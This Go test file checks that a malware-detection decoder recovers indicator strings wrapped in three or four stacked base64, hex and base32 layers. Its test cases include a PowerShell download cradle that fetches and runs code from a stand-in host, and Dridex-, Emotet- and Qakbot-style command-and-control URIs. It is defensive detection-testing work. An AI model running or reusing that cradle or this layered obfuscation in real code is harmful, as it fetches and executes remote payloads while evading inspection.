// MSD-6 differential corpus — synthetic multi-layer carriers built from
// IOC-SHAPED strings (C2-URI / download-cradle shapes that mirror real Dridex/
// Emotet/Qakbot tradecraft; they are illustrative strings, NOT published live
// IOCs, and nothing here is executed). Each is wrapped in 3+ stacked encode
// layers using the exact transforms the MSD decoder peels (base64 / hex /
// base32), so the test falsifies the "lead on multi-layer decode" claim on the
// recoverable-payload STRUCTURE rather than on invariants alone.
//
// Why synthetic and not wild samples: as of 2026-06 the wild >=3-layer encoded
// maldoc (Dridex-style base64-over-hex-over-… droppers) has aged off the public
// feeds (MalwareBazaar `xlmmacro` -> no_results; Dridex uploads are all PE; a
// 30-sample triage found 0 with depth>=3). The encoding STRUCTURE is what MSD
// decodes, and it is fully reproducible here without a malware file on the host.
// See TODO.md MSD-6 + history.md.
package extract

import (
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"strings"
	"testing"
	"time"
)

// layerEncode applies one encode layer of the named scheme. The schemes are
// exactly those decodeSourceTree peels; each output is itself a valid encoded run
// (>= the decoder's per-scheme minimum) so the next layer in / decode layer out
// recurses cleanly.
func layerEncode(scheme string, in []byte) []byte {
	switch scheme {
	case "base64":
		return []byte(base64.StdEncoding.EncodeToString(in))
	case "hex":
		return []byte(hex.EncodeToString(in))
	case "base32":
		return []byte(base32.StdEncoding.EncodeToString(in))
	default:
		panic("unknown scheme " + scheme)
	}
}

// wrapLayers wraps inner through schemes[0], then schemes[1], … so schemes[last]
// is the OUTERMOST encoding (the bytes "on disk"). The decoder peels outer-first,
// so it sees schemes[last] -> … -> schemes[0] -> inner cleartext.
func wrapLayers(inner string, schemes ...string) []byte {
	b := []byte(inner)
	for _, s := range schemes {
		b = layerEncode(s, b)
	}
	return b
}

func TestMSDDifferentialCorpus(t *testing.T) {
	// Public IOC strings from vendor threat reports (detection strings, not
	// binaries). Long enough that every encoded layer clears the decoder's
	// minimum run length (base64 >=24 chars, hex >=32, base32 >=… ), and the
	// decoded inner clears minDecodedLen (8).
	cases := []struct {
		name    string
		ioc     string
		schemes []string // inner-first; last = outermost (on-disk) layer
	}{
		{
			// Dridex loader C2 URI shape (illustrative, not a live IOC).
			name:    "dridex_c2_b64_hex_b64",
			ioc:     "https://193.0.178.0/dridex/loader.php?id=botnet220",
			schemes: []string{"base64", "hex", "base64"},
		},
		{
			// Emotet (Heodo) epoch C2 endpoint shape.
			name:    "emotet_c2_hex_b64_hex",
			ioc:     "http://emotet-epoch5.example/modules/payload.dll",
			schemes: []string{"hex", "base64", "hex"},
		},
		{
			// PowerShell download cradle — the classic stacked-encoding carrier.
			name:    "ps_cradle_b64_b64_hex",
			ioc:     "powershell -enc IEX(New-Object Net.WebClient).DownloadString('http://host/p')",
			schemes: []string{"base64", "base64", "hex"},
		},
		{
			// Four layers incl. base32 in the middle — deepest case (depth 4).
			name:    "qakbot_b64_b32_hex_b64",
			ioc:     "https://qakbot-distro.example/444/data.dat?u=victim",
			schemes: []string{"base64", "base32", "hex", "base64"},
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			carrier := wrapLayers(c.ioc, c.schemes...)

			// The on-disk carrier must NOT contain the cleartext IOC (it is buried
			// under the encode layers) — otherwise the test would pass trivially on
			// the raw bytes without the decoder doing anything.
			if strings.Contains(string(carrier), c.ioc) {
				t.Fatalf("carrier leaks cleartext IOC before decode")
			}

			// No deadline (time.Time{}): the decode caps bound the work; a wall-clock
			// here would only add CI flakiness on an overloaded runner.
			res := ExtractWithOptions(carrier, FullOptions(time.Time{}))

			// The decoder must surface the inner cleartext IOC.
			if !streamsContain(res, c.ioc) {
				t.Errorf("inner IOC %q not recovered through %d layers; streams=%d",
					c.ioc, len(c.schemes), len(res.Streams))
				for i, s := range res.Streams {
					t.Logf("  stream[%d] (%d bytes): %.80q", i, len(s), s)
				}
				return
			}

			// >=3 stacked layers must raise the MSD-DEEPDECODE deep-decode marker
			// (deepDecodeLayer=3) — the signal RULE-MSD-MULTILAYER scores.
			if len(c.schemes) >= deepDecodeLayer {
				if !streamsContain(res, "MSD-DEEPDECODE") {
					t.Errorf("%d-layer carrier did not raise MSD-DEEPDECODE marker", len(c.schemes))
				}
			}
		})
	}
}

// TestMSDDifferentialEffortGate ties the corpus to EFFORT-4: at the shallowest
// effort (DecodeDepth 1) a deeply-wrapped IOC must stay hidden, and at full depth
// it must surface — proving the dial gates real multi-layer recovery, not just a
// synthetic depth counter.
func TestMSDDifferentialEffortGate(t *testing.T) {
	const ioc = "https://193.0.178.0/dridex/loader.php?id=botnet220"
	carrier := wrapLayers(ioc, "base64", "hex", "base64") // 3 layers

	full := ExtractWithOptions(carrier, &Options{Deadline: time.Time{}, DecodeDepth: 4, DecodeIterations: 256})
	if !streamsContain(full, ioc) {
		t.Fatalf("full depth must recover the 3-layer IOC; streams=%d", len(full.Streams))
	}

	shallow := ExtractWithOptions(carrier, &Options{Deadline: time.Time{}, DecodeDepth: 1, DecodeIterations: 256})
	if streamsContain(shallow, ioc) {
		t.Errorf("depth 1 must NOT recover a 3-layer IOC; streams=%d", len(shallow.Streams))
	}
}
